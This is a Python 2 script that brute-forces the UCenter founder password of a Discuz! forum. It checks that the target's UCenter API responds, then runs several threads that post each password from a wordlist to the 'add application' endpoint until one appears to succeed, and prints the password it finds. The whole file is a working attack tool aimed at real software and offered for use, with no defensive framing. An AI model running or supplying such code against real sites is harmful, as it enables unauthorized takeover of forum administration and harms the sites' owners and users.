#coding:utf-8
import requests
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

from threading import Thread
from Queue import Queue


NUM=5

dicpath='pass.txt'

apptype='DISCUZX'
appname='Discuz!'
appurl='localhost'
ucclientrelease='20110501'


ucapi=''  # no '/' in the end!!

def testucserver():
	try:
		print ucapi
		r=requests.get(ucapi+'/index.php?m=app&a=ucinfo&release='+ucclientrelease)
		if 'UC_STATUS_OK' in r.text:
			return True
	except Exception as e:
		print e
		pass
	return False

def brute():
	while True:
		founderpw=q.get()
		print founderpw
		data={'m':'app','a':'add','ucfounder':'','ucfounderpw':founderpw,'apptype':apptype,'appname':appname,'appurl':appurl,'appip':'','appcharset':'gbk','appdbcharset':'gbk','release':ucclientrelease}
		posturl=ucapi+'/index.php'
		r = requests.post(posturl,data)
		while r.status_code!=200:
			r = requests.post(posturl,data)
		rt=r.text
		rt=rt.decode('gbk', 'ignore').encode('utf-8')
		#print rt
		if rt!='-1' and rt!='' and len(rt)<=200:
			print 'Founder Password found! : '+founderpw	
			print rt
			isExit = True
			break
			sys.exit()
		q.task_done()
	


if __name__ == '__main__':
	ucapi=sys.argv[1]
	if testucserver()==False:
		print 'UCAPI error'
		sys.exit()
	q=Queue()
	isExit = False
	for i in range(NUM):
		t = Thread(target=brute)
		#t.daemon=True
		t.setDaemon(True)
		t.start()
	print 'Threads started'
	with open(dicpath) as f:
		if (isExit!=False):
			sys.exit()
		for line in f:
			pw = line.strip()
			q.put(pw)
	f.close()
	q.join()








